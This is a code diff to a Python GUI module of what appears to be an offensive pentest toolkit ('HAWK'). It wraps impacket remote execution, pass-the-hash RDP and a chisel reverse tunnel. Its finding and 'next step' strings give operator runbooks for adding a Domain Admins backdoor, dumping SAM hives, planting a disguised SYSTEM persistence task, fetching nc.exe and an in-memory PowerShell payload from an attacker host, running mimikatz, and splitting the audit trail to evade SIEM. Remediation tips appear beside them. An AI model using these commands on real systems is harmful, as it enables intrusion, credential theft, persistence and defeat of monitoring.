+                        "  • Alert on Event ID 7045 with random 8-char "
+                        "service names — smbexec generates them the "
+                        "same way psexec does.\n"
+                        "  • Block inbound SMB from workstations with "
+                        "host-based firewall."
+                    ),
+                    "atexec": (
+                        "ATEXEC",
+                        "Task Scheduler RCE on {t}",
+                        "Single-shot remote command execution via "
+                        "Windows Task Scheduler "
+                        "(ITaskSchedulerService, impacket-atexec)."
+                        + _SEP.format("RESULT") +
+                        "  Target    : {t}:445 (SMB) + RPC 135\n"
+                        "  Auth      : {a}\n"
+                        "  Domain    : {dom}\n"
+                        "  Command   : {cmd}\n"
+                        "  Context   : NT AUTHORITY\\SYSTEM  (task "
+                        "runs as LocalSystem)\n"
+                        "  Output    : ADMIN$\\Temp\\<random>.tmp — "
+                        "check xterm.  STATUS_OBJECT_NAME_NOT_FOUND "
+                        "on Windows 2008 R2 is a timing race, NOT "
+                        "a failure: the task DID run."
+                        + _SEP.format("PROOF") +
+                        "  SYSTEM-level RCE via a code path distinct "
+                        "from psexec/wmiexec — useful when the loud "
+                        "ones are blocked or watched.  Single-shot: "
+                        "every command re-runs the full "
+                        "create/exec/read/delete cycle.  Requires "
+                        "local admin for remote task creation."
+                        + _SEP.format(
+                            "NEXT STEPS  (re-run ATEXEC, "
+                            "placeholders in <ANGLE>)") +
+                        "\n  [1] Add domain-admin persistence\n"
+                        "      $ net user <NEW_USER> <NEW_PASS> "
+                        "/add /domain\n"
+                        "      $ net group \"Domain Admins\" "
+                        "<NEW_USER> /add /domain\n"
+                        "      Why: DA account survives password "
+                        "rotations.  Pair with -silentcommand.\n\n"
+                        "  [2] Dump SAM + SYSTEM hives\n"
+                        "      $ reg save HKLM\\SAM "
+                        "C:\\Windows\\Temp\\sam.hiv\n"
+                        "      $ reg save HKLM\\SYSTEM "
+                        "C:\\Windows\\Temp\\sys.hiv\n"
+                        "      Then pull with impacket-smbclient and "
+                        "run secretsdump LOCAL offline → local admin "
+                        "NTLM for PtH.\n\n"
+                        "  [3] Fileless persistence task\n"
+                        "      $ powershell -w hidden -nop -c \n"
+                        "        \"schtasks /create /sc onstart "
+                        "/tn Updater\n"
+                        "         /tr 'C:\\Windows\\Temp\\pwn.exe' "
+                        "/ru SYSTEM\"\n"
+                        "      Why: benign task name, survives "
+                        "reboots, outlives the atexec ephemeral "
+                        "task.\n\n"
+                        "  [4] Stage attacker toolkit\n"
+                        "      $ curl http://<KALI>:<PORT>/nc.exe "
+                        "-o C:\\Windows\\Temp\\nc.exe\n"
+                        "      Why: SYSTEM+atexec is a clean "
+                        "downloader.  Pair with -silentcommand and "
+                        "an HTTP listener on Kali."
+                        + _SEP.format("HAWK TIP") +
+                        "  Check the dialog's -silentcommand box to "
+                        "skip the ADMIN$ output read entirely "
+                        "(fire-and-forget).  Recommended for "
+                        "persistence commands where the return value "
+                        "doesn't matter, and it dodges "
+                        "STATUS_OBJECT_NAME_NOT_FOUND on legacy "
+                        "Windows."
+                        + _SEP.format("REMEDIATION") +
+                        "  • Restrict remote task creation:\n"
+                        "      GPO > Computer Config > Admin "
+                        "Templates > System > Task Scheduler\n"
+                        "  • Audit Event ID 4698 (created) + 4699 "
+                        "(deleted) — atexec creates+deletes within "
+                        "seconds, unmistakable pattern.\n"
+                        "  • Block SMB (445) + RPC (135) from "
+                        "untrusted VLANs.\n"
+                        "  • Alert on 8-char random task names under "
+                        "\\ root + ADMIN$\\Temp writes matching 8 "
+                        "word-chars + .tmp."
+                    ),
+                    "dcomexec": (
+                        "DCOMEXEC",
+                        "DCOM remote code execution on {t}",
+                        "Remote command execution via DCOM "
+                        "(MMC20.Application.ExecuteShellCommand / "
+                        "ShellBrowserWindow.Document.Application, "
+                        "impacket-dcomexec)."
+                        + _SEP.format("RESULT") +
+                        "  Target    : {t}:135 (RPC) + dynamic high "
+                        "ports\n"
+                        "  Auth      : {a}\n"
+                        "  Domain    : {dom}\n"
+                        "  Context   : the authenticated user (NOT "
+                        "SYSTEM) — spawned by the COM host process "
+                        "(mmc.exe / explorer.exe) as that account.\n"
+                        "  Output    : xterm only — HAWK does not "
+                        "capture interactive I/O."
+                        + _SEP.format("PROOF") +
+                        "  RCE via a legitimate COM object as the "
+                        "spawn parent — no service install, no task, "
+                        "no ADMIN$ output file.  Lower-signal than "
+                        "psexec/wmiexec/atexec on most SIEM rulesets "
+                        "(mmc.exe spawning cmd.exe is unusual but "
+                        "not always flagged).  Requires local admin."
+                        + _SEP.format(
+                            "NEXT STEPS  (run inside the xterm)") +
+                        "\n  [1] Enumerate privileges\n"
+                        "      $ whoami /priv ; whoami /groups\n"
+                        "      Why: DCOM shells inherit YOUR token, "
+                        "not SYSTEM — check before staging LSASS or "
+                        "token-impersonation.\n\n"
+                        "  [2] Fileless PowerShell payload\n"
+                        "      $ powershell -w hidden -nop -c \n"
+                        "        \"IEX (New-Object Net.WebClient)."
+                        "DownloadString('http://<KALI>/pwn.ps1')\"\n"
+                        "      Why: the DCOM spawn parent is "
+                        "legitimate; the child PowerShell stays in "
+                        "memory.\n\n"
+                        "  [3] Split the audit trail via WMI\n"
+                        "      $ wmic process call create \n"
+                        "        \"cmd /c net user <U> <P> /add "
+                        "/domain\"\n"
+                        "      Why: chain DCOM → WMI process create; "
+                        "each hop uses a different spawn parent so "
+                        "SIEM alerts see two unrelated events."
+                        + _SEP.format("REMEDIATION") +
+                        "  • Restrict DCOM launch/activation:\n"
+                        "      dcomcnfg > My Computer > Properties >\n"
+                        "      COM Security > Launch and Activation\n"
+                        "      Permissions — remove Anonymous + "
+                        "Everyone.\n"
+                        "  • Block RPC 135 + dynamic ports from "
+                        "untrusted VLANs.\n"
+                        "  • Monitor Sysmon Event ID 1 with "
+                        "ParentImage=mmc.exe or "
+                        "svchost.exe -k DcomLaunch spawning "
+                        "cmd.exe / powershell.exe.\n"
+                        "  • Set DCOM authentication level to "
+                        "Packet Integrity:\n"
+                        "      HKLM\\Software\\Microsoft\\Ole\\"
+                        "LegacyAuthenticationLevel = 6"
+                    ),
+                }
+                _finding = _EXEC_FINDING.get(_active_method())
+                if _finding:
+                    try:
+                        from utils.run_id import new_run_id
+                        auth = f"{u} (hash)" if h else f"{u} (password)"
+                        src, ttl, desc = _finding
+                        fmt = {"t": target, "a": auth,
+                               "dom": d or "(none)",
+                               "cmd": atexec_cmd or "(none)"}
+                        self.app.target_intel.add_auto_finding(
+                            title=f"{src} — {ttl.format(**fmt)}",
+                            description=desc.format(**fmt),
+                            severity="high",
+                            source=src,
+                            linked_run_id=new_run_id(),
+                            replace=True)
+                    except Exception:
+                        pass
+
+                # ── Chain hint (next attacker step) ─────────────────
+                # Written to the HAWK terminal so the operator sees
+                # the next logical move without having to open the
+                # Target Intel panel and read the full runbook.
+                # Keys are METHOD names (as returned by
+                # _active_method()) — psexec / smbexec / wmiexec /
+                # atexec / dcomexec / evil_winrm — NOT tool.id.
+                _CHAIN_HINT = {
+                    "evil_winrm":
+                        "→ Next: 'whoami /priv' inside the shell "
+                        "to spot SeDebugPrivilege; then upload+run "
+                        "mimikatz for LSASS, or Invoke-Command to "
+                        "pivot to sibling WinRM hosts with the "
+                        "same creds (no re-auth).",
+                    "wmiexec":
+                        "→ Next: reg save HKLM\\SAM + HKLM\\SYSTEM "
+                        "to C:\\Windows\\Temp, then pull with "
+                        "impacket-smbclient and secretsdump LOCAL "
+                        "offline — yields the local admin NTLM for "
+                        "PtH on sibling hosts.  Or jump straight to "
+                        "SECRETSDUMP DCSync if this is a DC.",
+                    "psexec":
+                        "→ Next: you landed as SYSTEM — reg save "
+                        "SAM/SYSTEM/SECURITY hives, then run "
+                        "SECRETSDUMP DCSync (if DC) for the whole "
+                        "NTDS.  Plant persistence BEFORE closing "
+                        "the xterm (the RemComSvc service goes away "
+                        "when you exit).",
+                    "smbexec":
+                        "→ Next: SYSTEM shell without a disk drop — "
+                        "reg save SAM/SYSTEM/SECURITY hives and pull "
+                        "with impacket-smbclient, then run "
+                        "SECRETSDUMP DCSync (if DC).  Seed a "
+                        "scheduled task BEFORE closing xterm; the "
+                        "smbexec service is deleted on exit.",
+                    "atexec":
+                        "→ Next: re-run IMPACKET EXEC (atexec) with "
+                        "-silentcommand checked and the 'add DA' "
+                        "preset for persistence, or the 'dump SAM' "
+                        "preset then pull the hive via "
+                        "impacket-smbclient.  Also try SECRETSDUMP "
+                        "DCSync with same creds if this is a DC.",
+                    "dcomexec":
+                        "→ Next: DCOM shell runs as your user "
+                        "(NOT SYSTEM) — 'whoami /priv' to inspect "
+                        "the token, then IEX a PowerShell payload "
+                        "in-memory to keep the audit trail split "
+                        "between mmc.exe (spawn parent) and the "
+                        "payload's process.",
+                }
+                _hint = _CHAIN_HINT.get(_active_method())
+                if _hint:
+                    try:
+                        self.app.terminal.write(_hint, "info")
+                    except Exception:
+                        pass
                 return
 
             # Non-interactive — run through the normal pipeline.
@@ -557,16 +2027,36 @@ class CardADRoutesMixin:
         except Exception:
             dd = ""
 
-        win = _make_win(self, "RDP Connect", 560, 420)
+        win = _make_win(self, "RDP Connect", 620, 720)
         _title(win, "RDP CONNECT — xfreerdp3")
         _sub(win, f"Target: {target}  (port 3389)", COLORS["text_dim"])
 
+        # ── Bottom action row (packed FIRST at side=bottom so the
+        # scrollable body below claims the remaining space and never
+        # covers the CONNECT/CANCEL buttons on a short screen). ─────
+        bottom_row = ctk.CTkFrame(win, fg_color="transparent")
+        bottom_row.pack(side="bottom", pady=10)
+
+        # ── Scrollable body — the dialog is content-heavy (notes,
+        # 4 credential fields, target-aware hints, command preview,
+        # enable-RDP snippet) and needs to render on 720p laptops
+        # without cutting off the buttons.  Every widget below goes
+        # into `body`, not `win`, so the mouse wheel scrolls the
+        # dialog on any screen. ───────────────────────────────────
+        body = ctk.CTkScrollableFrame(
+            win, fg_color="transparent",
+            border_width=0, corner_radius=0)
+        body.pack(fill="both", expand=True, padx=0, pady=0)
+
         _note_box(
-            win,
+            body,
             "⚠  PREREQUISITES\n"
             "• RDP must be enabled on the target (port 3389 open,\n"
-            "  fDenyTSConnections = 0 in the registry).\n"
-            "  Use the 'RDP Enable (via shell)' card first if needed.\n"
+            "  fDenyTSConnections = 0 in the registry).  If it is\n"
+            "  not, use the 'Target RDP disabled?' section at the\n"
+            "  bottom of this dialog to grab the enable command\n"
+            "  and paste it into a shell you already own on the\n"
+            "  target.\n"
             "• You need valid credentials: local admin or domain user\n"
             "  with 'Allow log on through Remote Desktop Services' right.\n"
             "  A normal unprivileged domain user may be denied unless\n"
@@ -576,7 +2066,7 @@ class CardADRoutesMixin:
             COLORS["text_yellow"])
 
         def _row(label, var, show="", hint=""):
-            f = ctk.CTkFrame(win, fg_color="transparent")
+            f = ctk.CTkFrame(body, fg_color="transparent")
             f.pack(fill="x", padx=24, pady=(4, 0))
             ctk.CTkLabel(f, text=label, width=110, anchor="w",
                          font=_f("sm", True),
@@ -590,7 +2080,7 @@ class CardADRoutesMixin:
             e.pack(side="left", fill="x", expand=True)
             add_context_menu(e)
             if hint:
-                ctk.CTkLabel(win, text=hint, font=_f("xs"),
+                ctk.CTkLabel(body, text=hint, font=_f("xs"),
                              text_color=COLORS["text_dim"],
                              anchor="w").pack(fill="x", padx=24)
             return e
@@ -609,6 +2099,137 @@ class CardADRoutesMixin:
         _row("Domain",    domain_var,"",
              "optional — /d:<domain>, for AD targets")
 
+        # ── Target-aware hints (fingerprint-driven) ──────────────────
+        # xfreerdp3 has real interop pain across Windows generations
+        # (TLS handshake on 2008 R2, NLA + PtH interaction on 2016+).
+        # Surface only the ones that apply to THIS target so the
+        # operator knows why the connect might silently fail.
+        _tgt_tips = []
+        try:
+            fp = getattr(getattr(self.app, "target_intel", None),
+                         "_fp", None)
+            if fp is not None:
+                _os_ver = (getattr(fp, "version", "") or "").lower()
+                _gen    = (getattr(fp, "target_generation", "")
+                           or "").lower()
+                _ver_lit = getattr(fp, "version", "?")
+                if ("2008" in _os_ver or "2003" in _os_ver
+                        or "xp" in _os_ver or "vista" in _os_ver):
+                    _tgt_tips.append(
+                        f"Target = Windows {_ver_lit} — legacy TLS "
+                        "stack.  xfreerdp3 already forces "
+                        "/tls:seclevel:0; if the handshake still "
+                        "fails, add /sec:rdp (force pre-TLS RDP "
+                        "Security Layer) as a last resort.")
+                if ("2016" in _os_ver or "2019" in _os_ver
+                        or "2022" in _os_ver or "2025" in _os_ver
+                        or "10" == _os_ver or "11" == _os_ver):
+                    _tgt_tips.append(
+                        f"Target = Windows {_ver_lit} — Restricted "
+                        "Admin Mode (NLA) is usually ON.  "
+                        "Pass-the-hash (/pth:) needs the target's "
+                        "DisableRestrictedAdmin registry key set to "
+                        "0 AND the account in Remote Desktop Users; "
+                        "if you get 'CredSSP required' add "
+                        "/sec:nla and confirm the account has "
+                        "'Allow log on through RDP' rights.")
+                if _gen == "legacy":
+                    _tgt_tips.append(
+                        "Generation = legacy — HAWK's built-in "
+                        "compat flags (/tls:seclevel:0 + "
+                        "/cert:ignore) are already on.  If the "
+                        "xterm shows 'no common CredSSP flavor', "
+                        "the target only speaks vanilla RDP: add "
+                        "/sec:rdp.")
+        except Exception:
+            pass
+        # FreeRDP diagnostic noise, unrelated to real auth trouble:
+        # always applies (libkrb5's behaviour is baked into the
+        # binary, independent of the target), so it lives OUTSIDE
+        # the fingerprint branch — otherwise operators on a fresh
+        # session with no scan would never see the "ignore the
+        # Kerberos line" hint and would chase the red herring.
+        _tgt_tips.append(
+            "FreeRDP xterm noise you can ignore — before the NLA "
+            "fallback FreeRDP always tries Kerberos first and "
+            "prints a KDC error.  With /d:<domain> it complains "
+            "'Cannot find KDC for realm <DOMAIN>' (the DNS SRV "
+            "record for _kerberos._tcp.<domain> is missing on "
+            "Kali); without /d: it falls through to libkrb5's "
+            "baked-in default realm 'ATHENA.MIT.EDU'.  Neither "
+            "matters — HAWK never contacts MIT, Kerberos is "
+            "expected to fail in a lab without a resolvable KDC, "
+            "and FreeRDP retries with NTLM/CredSSP automatically. "
+            "Look for the LOGON_FAILED / CredSSP / TLS lines "
+            "that come AFTER the Kerberos error to know the "
+            "real outcome.")
+        if _tgt_tips:
+            _note_box(
+                body,
+                "TARGET-AWARE HINTS (from session fingerprint):\n\n"
+                + "\n\n".join(f"• {t}" for t in _tgt_tips),
+                COLORS["border_amber"])
+
+        # ── Command builder (shared by preview + run) ────────────────
+        def _build_rdp_cmd(placeholder=False):
+            def _v(x, ph):
+                return x if x else (f"<{ph}>" if placeholder else "")
+            u  = _v(user_var.get().strip(), "user")
+            p  = pass_var.get().strip()
+            h  = hash_var.get().strip()
+            d  = domain_var.get().strip()
+            parts = [
+                "xfreerdp3",
+                f"/v:{target}",
+                f"/u:{_shq(u)}",
+            ]
+            if d:
+                parts.append(f"/d:{_shq(d)}")
+            if h:
+                nt = h.split(":")[-1] if ":" in h else h
+                parts.append(f"/pth:{_shq(nt)}")
+            else:
+                pw = _v(p, "password")
+                parts.append(f"/p:{_shq(pw)}")
+            parts += [
+                "/cert:ignore",
+                "/tls:seclevel:0",
+                "/dynamic-resolution",
+            ]
+            return " ".join(parts)
+
+        # ── Live command preview ─────────────────────────────────────
+        preview_var = ctk.StringVar(value="")
+        _prev_box = ctk.CTkFrame(
+            body, fg_color=COLORS["bg_card"],
+            border_color=COLORS["border_green"],
+            border_width=1, corner_radius=3)
+        _prev_box.pack(fill="x", padx=24, pady=(8, 0))
+        ctk.CTkLabel(
+            _prev_box, text="COMMAND PREVIEW",
+            font=_f("xs", True),
+            text_color=COLORS["text_dim"],
+            anchor="w").pack(fill="x", padx=8, pady=(4, 0))
+        ctk.CTkLabel(
+            _prev_box, textvariable=preview_var,
+            font=_f("sm"),
+            text_color=COLORS["text_green"],
+            anchor="w", justify="left",
+            wraplength=490).pack(fill="x", padx=8, pady=(0, 6))
+
+        def _update_preview(*_):
+            try:
+                preview_var.set("$ " + _build_rdp_cmd(placeholder=True))
+            except Exception as e:
+                preview_var.set(f"$ (preview error: {e})")
+
+        for _v_trace in (user_var, pass_var, hash_var, domain_var):
+            try:
+                _v_trace.trace_add("write", _update_preview)
+            except Exception:
+                pass
+        _update_preview()
+
         def _run():
             u = user_var.get().strip()
             p = pass_var.get().strip()
@@ -625,25 +2246,7 @@ class CardADRoutesMixin:
                     "NTLM hash.", "warn")
                 return
 
-            # Build xfreerdp3 command
-            cmd_parts = [
-                "xfreerdp3",
-                f"/v:{target}",
-                f"/u:{_shq(u)}",
-            ]
-            if d:
-                cmd_parts.append(f"/d:{_shq(d)}")
-            if h:
-                nt = h.split(":")[-1] if ":" in h else h
-                cmd_parts.append(f"/pth:{_shq(nt)}")
-            else:
-                cmd_parts.append(f"/p:{_shq(p)}")
-            cmd_parts += [
-                "/cert:ignore",
-                "/tls:seclevel:0",
-                "/dynamic-resolution",
-            ]
-            cmd = " ".join(cmd_parts)
+            cmd = _build_rdp_cmd(placeholder=False)
 
             _safe_destroy(win)
 
@@ -668,10 +2271,167 @@ class CardADRoutesMixin:
                 self.app.terminal.write(
                     "[!] No terminal emulator available — "
                     "install xterm: sudo apt install -y xterm", "error")
+                return
 
-        row = _btn_row(win)
-        _btn(row, "CONNECT", _run, primary=True, w=120)
-        _btn(row, "CANCEL", lambda: _safe_destroy(win))
+            # ── Tool status + session execution record ───────────────
+            # xterm-launched tools bypass ToolRunner, so we must
+            # flip the card status and log the run manually — same
+            # pattern the impacket_exec / evil_winrm xterm paths use.
+            self._set_tool_status(tool.id, "done")
+            try:
+                sess = self.app.session_manager.current
+                if sess is not None:
+                    eid = sess.start_tool_execution(
+                        tool_id=tool.id, tool_name=tool.name,
+                        phase_id=getattr(self, "phase_id", ""),
+                        command=cmd)
+                    if eid:
+                        sess.finish_tool_execution(
+                            eid, 0, ["(interactive xterm session)"],
+                            "done")
+            except Exception:
+                pass
+
+            # ── LOW-severity "launched, verify" finding ──────────────
+            # HAWK cannot observe the RDP session — we claim only
+            # what actually happened (the connect was launched).
+            # LAUNCH != successful login: xfreerdp3 may still fail
+            # on credentials, NLA, or TLS handshake.  Different
+            # title from any confirmed-shell finding so the two
+            # never merge over each other.
+            try:
+                from utils.run_id import new_run_id
+                auth = f"{u} (hash)" if h else f"{u} (password)"
+                self.app.target_intel.add_auto_finding(
+                    title=(f"RDP CONNECT — xfreerdp3 launched "
+                           f"against {target}"),
+                    description=(
+                        f"xfreerdp3 was launched in an xterm "
+                        f"against {target}.  HAWK does not capture "
+                        f"the RDP session — verify the graphical "
+                        f"window / xterm to know if the connect "
+                        f"actually succeeded.\n\n"
+                        f"  Target : {target}:3389\n"
+                        f"  Auth   : {auth}\n"
+                        f"  Domain : {d or '(none)'}\n\n"
+                        f"Common failure modes:\n"
+                        f"  • CredSSP / NLA: 'CredSSP required by "
+                        f"server' → add /sec:nla or use a domain "
+                        f"account with RDP-explicit rights.\n"
+                        f"  • Pass-the-hash rejected on Windows "
+                        f"2016+: target needs "
+                        f"DisableRestrictedAdmin=0 in "
+                        f"HKLM\\System\\CurrentControlSet\\Control\\"
+                        f"Lsa.\n"
+                        f"  • TLS handshake fail on legacy Windows: "
+                        f"already mitigated by "
+                        f"/tls:seclevel:0 /cert:ignore; last resort "
+                        f"is /sec:rdp.\n"
+                        f"  • Account not in Remote Desktop Users "
+                        f"group: grant with "
+                        f"'net localgroup \"Remote Desktop Users\" "
+                        f"<user> /add' from another shell.\n\n"
+                        f"If the RDP session landed, promote this "
+                        f"finding manually (HIGH — interactive shell "
+                        f"with GUI) and note the account context "
+                        f"seen inside the session."),
+                    severity="low",
+                    source="RDP-CONNECT",
+                    linked_run_id=new_run_id(),
+                    replace=True)
+            except Exception:
+                pass
+
+            # Chain hint written to the HAWK terminal so the
+            # operator sees the next logical move without opening
+            # Target Intel.
+            try:
+                self.app.terminal.write(
+                    "→ Next: if the RDP session landed, drop into "
+                    "a cmd/PowerShell prompt and run 'whoami "
+                    "/priv' + 'whoami /groups' to enumerate token "
+                    "rights; from there mimikatz LSASS if "
+                    "SeDebugPrivilege is available, or "
+                    "SECRETSDUMP Target dump for local SAM/LSA.",
+                    "info")
+            except Exception:
+                pass
+
+        # ── ENABLE-RDP section (assimilates the old rdp_enable card) ──
+        # RDP disabled on the target is the #1 reason CONNECT hangs
+        # on ERRCONNECT_CONNECT_FAILED.  Instead of a separate card
+        # that just shows a copy-paste command in isolation, the same
+        # snippet lives here — where the operator actually needs it,
+        # one dialog away from the CONNECT they just failed.
+        _enable_cmd = (
+            'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\'
+            'Terminal Server" /v fDenyTSConnections /t REG_DWORD '
+            '/d 0 /f & '
+            'netsh advfirewall firewall set rule '
+            'group="remote desktop" new enable=Yes')
+
+        _en_frame = ctk.CTkFrame(
+            body, fg_color=COLORS["bg_card"],
+            border_color=COLORS["border_dim"],
+            border_width=1, corner_radius=4)
+        _en_frame.pack(fill="x", padx=24, pady=(10, 4))
+        ctk.CTkLabel(
+            _en_frame,
+            text="  Target RDP disabled?  Enable it on the target:",
+            font=_f("sm", True),
+            text_color=COLORS["text_bright"],
+            anchor="w").pack(fill="x", padx=10, pady=(8, 2))
+        ctk.CTkLabel(
+            _en_frame,
+            text=("  Paste in a shell you already own on the "
+                  "target (evil-winrm, wmiexec, psexec, atexec).  "
+                  "Requires admin — reg needs write on Terminal "
+                  "Server key, netsh needs firewall context."),
+            font=_f("xs"), text_color=COLORS["text_dim"],
+            anchor="w", justify="left",
+            wraplength=520).pack(fill="x", padx=10, pady=(0, 4))
+
+        _en_box = ctk.CTkTextbox(
+            _en_frame, height=54, font=("Courier New", 11),
+            fg_color=COLORS["bg_secondary"],
+            text_color=COLORS["text_bright"],
+            border_color=COLORS["border_dim"], border_width=1,
+            corner_radius=3, wrap="word")
+        _en_box.pack(fill="x", padx=10, pady=(0, 6))
+        _en_box.insert("1.0", _enable_cmd)
+        _en_box.configure(state="disabled")
+
+        def _copy_enable():
+            try:
+                win.clipboard_clear()
+                win.clipboard_append(_enable_cmd)
+                win.update()
+                _en_copy.configure(text="✓  COPIED")
+                def _reset():
+                    if _en_copy.winfo_exists():
+                        _en_copy.configure(
+                            text="📋  COPY ENABLE-RDP CMD")
+                win.after(1500, _reset)
+            except Exception:
+                pass
+            self.app.terminal.write(
+                "  [+] Enable-RDP command copied — paste in a "
+                "shell on the target (admin required).", "success")
+
+        _en_copy = ctk.CTkButton(
+            _en_frame, text="📋  COPY ENABLE-RDP CMD",
+            width=220, height=30, font=_f("sm", True),
+            fg_color=COLORS["bg_card"],
+            hover_color=COLORS["bg_card_hover"],
+            border_color=COLORS["text_cyan"], border_width=1,
+            text_color=COLORS["text_cyan"], corner_radius=3,
+            command=_copy_enable)
+        _en_copy.pack(anchor="w", padx=10, pady=(0, 10))
+
+        # bottom_row was reserved at the top of the dialog so the
+        # scrollable body never covers CONNECT/CANCEL.
+        _btn(bottom_row, "CONNECT", _run, primary=True, w=120)
+        _btn(bottom_row, "CANCEL", lambda: _safe_destroy(win))
 
     def _route_netsh_portfwd(self, tool):
         """Guided dialog for Netsh Port Forward.
@@ -844,6 +2604,275 @@ class CardADRoutesMixin:
             command=_copy_add)
         copy_btn.pack(side="left", padx=6)
         _btn(btn_row, "CLOSE", lambda: _safe_destroy(win), w=100)
+
+    def _route_chisel_server(self, tool):
+        """Launch `chisel server --reverse` in an xterm background.
+
+        The bare RUN path routes chisel_server through ToolRunner's
+        captureable pipe — but chisel is a listener that never exits, so
+        the pipe fills, the card stays in RUNNING forever, and the
+        server dies the moment the operator closes the card, switches
+        session or exits HAWK.  Same problem sshuttle and penelope have,
+        and it's fixed the same way here: mini dialog collects the port,
+        previews the resolved command, spawns an xterm that owns the
+        server process, and records a LOW `launched, verify` finding
+        (LANCIO != successful tunnel — HAWK doesn't know if a client
+        will ever connect).
+        """
+        from gui.dialogs import (_make_win, _title, _sub, _note_box,
+                                 _btn_row, _btn, _safe_destroy)
+        from utils.runner import (_open_terminal, lhost_detect,
+                                  lhost_for_target)
+
+        # Pick the Kali IP the TARGET can actually reach: on a
+        # multi-homed Kali (typical lab setup — eth0 on an isolated
+        # attacker net, eth1 on the routed target subnet), the
+        # default route's IP is not the one the target can dial back
+        # to.  `lhost_for_target` uses `ip route get` to ask the
+        # kernel which source address it would use for this target,
+        # then falls back to the ranked global lhost when no session
+        # target is set.
+        target = ""
+        try:
+            target = self._get_target() or ""
+        except Exception:
+            target = ""
+        kali_ip = (lhost_for_target(target) if target
+                   else lhost_detect()) or "<KALI_IP>"
+
+        win = _make_win(self, "CHISEL Server — Reverse tunnel listener",
+                        620, 560)
+        _title(win, "🔀  CHISEL SERVER — reverse tunnel listener")
+        _sub(win, f"Kali IP: {kali_ip}", COLORS["text_dim"])
+
+        _note_box(win,
+            "HOW IT WORKS\n\n"
+            "Starts `chisel server --reverse` on Kali.  A chisel client "
+            "on the pivot connects back and publishes a SOCKS5 proxy on "
+            "Kali at 127.0.0.1:1080 that carries traffic INTO the "
+            "pivot's network.\n\n"
+            "   Internal net  ←→  pivot (client)  ←—— tunnel ——→  "
+            "Kali (server here)\n"
+            "                                             "
+            "127.0.0.1:1080 SOCKS5",
+            COLORS["text_cyan"])
+
+        _note_box(win,
+            "⚠  LONG-RUNNING\n\n"
+            "The server keeps running until you CLOSE THE XTERM (or "
+            "CTRL+C inside it).  Closing this HAWK card does NOT stop "
+            "the server — that's on purpose so the tunnel survives "
+            "phase switches.",
+            COLORS["border_amber"], text_color=COLORS["text_yellow"])
+
+        # ── Port field ─────────────────────────────────────────
+        param = ctk.CTkFrame(win, fg_color=COLORS["bg_card"],
+                              border_color=COLORS["border_dim"],
+                              border_width=1, corner_radius=4)
+        param.pack(fill="x", padx=16, pady=(8, 4))
+        ctk.CTkLabel(param, text="  Listener port:",
+                     font=_f("sm", True),
+                     text_color=COLORS["text_bright"],
+                     anchor="w").pack(fill="x", padx=10, pady=(8, 4))
+
+        port_var = ctk.StringVar(value="9000")
+        entry = ctk.CTkEntry(param, textvariable=port_var, width=100,
+            height=28, font=_f("sm"),
+            fg_color=COLORS["bg_secondary"],
+            text_color=COLORS["text_bright"],
+            border_color=COLORS["border_green"], border_width=1,
+            corner_radius=3, placeholder_text="9000")
+        entry.pack(anchor="w", padx=10, pady=(0, 4))
+        ctk.CTkLabel(param,
+            text=("  Must match the port the chisel client on the "
+                  "pivot connects to."),
+            font=_f("xs"), text_color=COLORS["text_dim"],
+            anchor="w").pack(fill="x", padx=10, pady=(0, 8))
+
+        # ── Live command preview ─────────────────────────────
+        preview_var = ctk.StringVar(value="")
+        _prev_box = ctk.CTkFrame(
+            win, fg_color=COLORS["bg_card"],
+            border_color=COLORS["border_green"],
+            border_width=1, corner_radius=3)
+        _prev_box.pack(fill="x", padx=16, pady=(8, 0))
+        ctk.CTkLabel(
+            _prev_box, text="COMMAND PREVIEW",
+            font=_f("xs", True), text_color=COLORS["text_dim"],
+            anchor="w").pack(fill="x", padx=8, pady=(4, 0))
+        ctk.CTkLabel(
+            _prev_box, textvariable=preview_var,
+            font=_f("sm"), text_color=COLORS["text_green"],
+            anchor="w", justify="left",
+            wraplength=560).pack(fill="x", padx=8, pady=(0, 6))
+
+        def _build_cmd(port):
+            return f"chisel server --port {port} --reverse"
+
+        def _update_preview(*_):
+            p = (port_var.get() or "").strip() or "9000"
+            preview_var.set(f"$ {_build_cmd(p)}")
+
+        try:
+            port_var.trace_add("write", _update_preview)
+        except Exception:
+            pass
+        _update_preview()
+
+        def _launch():
+            p = (port_var.get() or "").strip() or "9000"
+            if not p.isdigit() or not (1 <= int(p) <= 65535):
+                self.app.terminal.write(
+                    f"  [!] CHISEL Server — invalid port '{p}'.",
+                    "warn")
+                return
+
+            cmd = _build_cmd(p)
+            _safe_destroy(win)
+
+            self.app.terminal.section(
+                "LATERAL MOVEMENT  ·  CHISEL Server")
+            self.app.terminal.write(f"  $ {cmd}", "cmd")
+            self.app.terminal.write(
+                f"  [*] chisel server launching in xterm — listener "
+                f"on {kali_ip}:{p}. Close the xterm to stop it.",
+                "info")
+
+            script = (
+                f"echo '═══  HAWK — CHISEL Server :{p}  ═══'; "
+                f"echo 'Listening on {kali_ip}:{p} (--reverse).'; "
+                f"echo 'CTRL+C or close this window stops the server.'; "
+                f"echo ''; "
+                f"{cmd}; "
+                f"echo ''; "
+                f"read -p 'Server stopped. Press ENTER to close...'")
+            ok = _open_terminal(f"HAWK — CHISEL Server :{p}", script)
+            if not ok:
+                self.app.terminal.write(
+                    "  [!] No terminal emulator available — install "
+                    "xterm: sudo apt install -y xterm", "error")
+                return
+
+            # ── Tool status + session execution record ─────────
+            # Card stays RUNNING (yellow) because the listener is
+            # long-lived — HAWK cannot observe when the operator
+            # closes the xterm, so "done" would be a lie.  The
+            # executed_tools entry, on the other hand, IS done: it
+            # records the launch invocation, which completed the
+            # moment the xterm was spawned; the process itself
+            # continues outside HAWK.
+            self._set_tool_status(tool.id, "running")
+            try:
+                sess = self.app.session_manager.current
+                if sess is not None:
+                    eid = sess.start_tool_execution(
+                        tool_id=tool.id, tool_name=tool.name,
+                        phase_id=getattr(self, "phase_id", ""),
+                        command=cmd)
+                    if eid:
+                        sess.finish_tool_execution(
+                            eid, 0, ["(interactive xterm session)"],
+                            "done")
+            except Exception:
+                pass
+
+            # ── Register a stop-runner and flip RUN → STOP ─────
+            # HAWK already knows how to flip a tool row to STOP
+            # (red) and route the click to `runner.kill()` — we
+            # just need a runner object with a `.kill()` method.
+            # The listener lives in a bash child of the xterm, so
+            # a plain Popen.terminate() on the xterm wouldn't reach
+            # it (no shared process group); we `pkill -f` on the
+            # exact port instead, which is precise enough because
+            # any concurrent `chisel server --port N` on the same
+            # port would already be a bind clash.
+            #
+            # After the pkill we override the button's command to
+            # our own cleanup so the row lands back on READY
+            # instead of ERROR: the operator intentionally stopped
